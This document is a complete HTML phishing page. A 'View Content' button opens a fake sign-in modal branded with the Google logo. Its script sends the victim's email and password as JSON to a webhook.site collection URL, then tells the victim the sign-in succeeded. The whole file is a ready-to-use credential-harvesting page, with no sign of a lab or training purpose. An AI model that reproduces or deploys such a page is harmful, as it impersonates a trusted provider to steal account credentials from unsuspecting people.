<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - My App</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .view-content-btn {
            background-color: #1a73e8;
            color: white;
            padding: 14px 40px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        .view-content-btn:hover {
            background-color: #1765cc;
        }
        /* Modal styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
            padding: 20px;
            z-index: 1000;
        }
        .modal-content {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            width: 400px;
            text-align: center;
        }
        .modal h3 {
            margin-bottom: 20px;
            color: #202124;
        }
        .modal p {
            margin-bottom: 20px;
            color: #555;
        }
        .modal input[type="email"], .modal input[type="password"] {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 14px;
            outline: none;
            box-sizing: border-box;
        }
        .modal input[type="email"]:focus, .modal input[type="password"]:focus {
            border-color: #1a73e8;
            box-shadow: 0 1px 3px rgba(26, 115, 232, 0.3);
        }
        .modal button {
            background-color: #1a73e8;
            color: white;
            padding: 14px;
            margin-top: 20px;
            width: 100%;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
        }
        .modal button:hover {
            background-color: #1765cc;
        }
        .logo img {
            width: 100px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <!-- Button to View Content (triggers login form) -->
    <button class="view-content-btn" id="viewContentButton">View Content</button>

    <!-- Modal (Login Form) -->
    <div class="modal" id="loginModal">
        <div class="modal-content">
            <!-- Google Logo -->
            <div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/512px-Google_2015_logo.svg.png" alt="Google Logo">
            </div>
            <h3>Sign in</h3>
            <form id="authForm">
                <input type="email" id="email" placeholder="Email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Next</button>
            </form>
            <a href="#">Forgot password?</a>
        </div>
    </div>

    <script>
        // Show the login form when the "View Content" button is clicked
        document.getElementById('viewContentButton').addEventListener('click', function() {
            document.getElementById('loginModal').style.display = 'flex';
        });

        // Handle form submission
        document.getElementById('authForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            // Capture input values
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Send POST request using Fetch API
            fetch('https://webhook.site/f493ab7d-be4a-48be-b4e2-c80171e0241d', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ email, password }),
            })
            .then(response => {
                if (response.ok) {
                    alert('Sign-in successful! You can now access the content.');
                    document.getElementById('loginModal').style.display = 'none'; // Close the modal
                } else {
                    alert('Failed to sign in. Please try again.');
                }
            })
            .catch(error => {
                alert('Error: ' + error.message);
            });
        });

        // Optional: Close the modal by clicking outside it (clicking on the overlay)
        document.getElementById('loginModal').addEventListener('click', function(event) {
            if (event.target === document.getElementById('loginModal')) {
                document.getElementById('loginModal').style.display = 'none';
            }
        });
    </script>

</body>
</html>
